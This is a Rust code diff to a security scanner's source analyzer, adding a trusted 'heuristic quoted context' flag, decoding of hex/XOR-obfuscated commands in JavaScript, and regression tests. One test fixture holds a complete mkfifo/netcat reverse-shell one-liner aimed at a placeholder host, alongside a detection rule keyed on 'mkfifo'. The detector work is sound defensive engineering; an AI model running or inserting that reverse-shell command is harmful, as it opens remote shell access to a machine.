@@ -344,6 +344,8 @@ pub(crate) struct UnifiedSourceAnalyzer {
     cancellation: Option<std::sync::Arc<std::sync::atomic::AtomicBool>>,
     /// Encoding chain for decoded embedded-code layers.
     encoded_context: Option<Vec<String>>,
+    /// Trusted parser context, never inferred from a disk filename.
+    heuristic_quoted_context: bool,
 }
 
 impl std::fmt::Debug for UnifiedSourceAnalyzer {
@@ -366,6 +368,7 @@ impl UnifiedSourceAnalyzer {
             skip_embedded_detection: false,
             cancellation: None,
             encoded_context: None,
+            heuristic_quoted_context: false,
         }
     }
 
@@ -401,6 +404,13 @@ impl UnifiedSourceAnalyzer {
     /// Set encoded-layer context for metrics on decoded embedded-code files.
     pub(crate) fn with_encoded_context(mut self, encoding_chain: Vec<String>) -> Self {
         self.encoded_context = Some(encoding_chain);
+        self.heuristic_quoted_context = false;
+        self
+    }
+
+    pub(crate) fn with_heuristic_quoted_context(mut self) -> Self {
+        self.heuristic_quoted_context = true;
+        self.encoded_context = None;
         self
     }
 
@@ -497,6 +507,11 @@ impl UnifiedSourceAnalyzer {
         };
 
         let mut report = AnalysisReport::new(target);
+        if self.heuristic_quoted_context {
+            report
+                .findings
+                .push(crate::analyzers::embedded_code_detector::heuristic_quoted_origin_finding());
+        }
         // Encoding context is input to this layer's rules, not an output
         // appended after evaluation. The host still retains this layer.
         if let Some(chain) = &self.encoded_context {
@@ -904,6 +919,24 @@ impl UnifiedSourceAnalyzer {
         // (e.g. decoding a -EncodedCommand payload), skip to avoid infinite loops.
         if !self.skip_embedded_detection {
             let parent = file_path.display().to_string();
+            if matches!(self.file_type, FileType::JavaScript | FileType::TypeScript)
+                && let Some(ast) = source_ast
+            {
+                for command in super::js_xor_command::decode(ast) {
+                    if let Some(layer) = super::embedded_code_detector::analyze_decoded_script_layer(
+                        &parent,
+                        &command.text,
+                        command.offset,
+                        command.file_type,
+                        vec!["hex".into(), "xor".into()],
+                        &self.engine,
+                        parent.matches("##").count(),
+                        false,
+                    ) {
+                        report.files.push(layer);
+                    }
+                }
+            }
             if self.file_type == FileType::Python
                 && let Some(ast) = source_ast
             {
@@ -1862,6 +1895,93 @@ impl Analyzer for UnifiedSourceAnalyzer {
 #[allow(clippy::unwrap_used, clippy::expect_used)]
 mod tests {
     use super::*;
+
+    fn quoted_origin_probe_engine() -> crate::Engine {
+        let dir = tempfile::tempdir().unwrap();
+        let path = dir.path().join("traits.yaml");
+        std::fs::write(
+            &path,
+            r#"
+defaults:
+  for: [shell]
+  platforms: [unix, windows]
+traits:
+  - id: test/source::origin-probe
+    desc: Origin scope regression probe
+    crit: notable
+    if:
+      type: text
+      substr: mkfifo
+    unless:
+      - id: metadata/lang/source/origin::heuristic-quoted-source
+"#,
+        )
+        .unwrap();
+        crate::Engine::from_rules(Arc::new(
+            crate::capabilities::CapabilityMapper::from_yaml(&path).unwrap(),
+        ))
+    }
+
+    #[test]
+    fn heuristic_quoted_origin_is_explicit_before_rules_not_derived_from_filename() {
+        let code = "mkfifo /tmp/f\n";
+        let engine = quoted_origin_probe_engine();
+        for path in ["actual.sh", "actual.sh##plain@0x0"] {
+            let report = UnifiedSourceAnalyzer::for_file_type(&FileType::Shell)
+                .unwrap()
+                .with_engine(engine.clone())
+                .analyze_source_as_configured(Path::new(path), code);
+            assert!(
+                report
+                    .findings
+                    .iter()
+                    .any(|f| f.id == "test/source::origin-probe")
+            );
+            assert!(
+                !report.findings.iter().any(|f| f.id
+                    == crate::analyzers::embedded_code_detector::HEURISTIC_QUOTED_ORIGIN_ID)
+            );
+        }
+        let report = UnifiedSourceAnalyzer::for_file_type(&FileType::Shell)
+            .unwrap()
+            .with_engine(engine)
+            .with_heuristic_quoted_context()
+            .analyze_source_as_configured(Path::new("carrier.py##plain@0x20"), code);
+        assert!(
+            !report
+                .findings
+                .iter()
+                .any(|f| f.id == "test/source::origin-probe")
+        );
+        assert!(report.findings.iter().any(|f| f.id
+            == crate::analyzers::embedded_code_detector::HEURISTIC_QUOTED_ORIGIN_ID
+            && f.crit == crate::Criticality::Baseline));
+    }
+
+    #[test]
+    fn encoded_context_clears_heuristic_quoted_origin() {
+        let engine = quoted_origin_probe_engine();
+        let code = "mkfifo /tmp/f; sh -c 'sh </tmp/f | nc example.test 4444 >/tmp/f'";
+        let report = UnifiedSourceAnalyzer::for_file_type(&FileType::Shell)
+            .unwrap()
+            .with_engine(engine)
+            .with_heuristic_quoted_context()
+            .with_encoded_context(vec!["base32".into()])
+            .analyze_source_as_configured(Path::new("carrier.py##base32@0x20"), code);
+        assert!(
+            report
+                .findings
+                .iter()
+                .any(|f| f.id == "test/source::origin-probe")
+        );
+        assert!(
+            !report
+                .findings
+                .iter()
+                .any(|f| f.id
+                    == crate::analyzers::embedded_code_detector::HEURISTIC_QUOTED_ORIGIN_ID)
+        );
+    }
 
     #[test]
     fn groovy_single_quoted_commands_reach_literal_rules() {
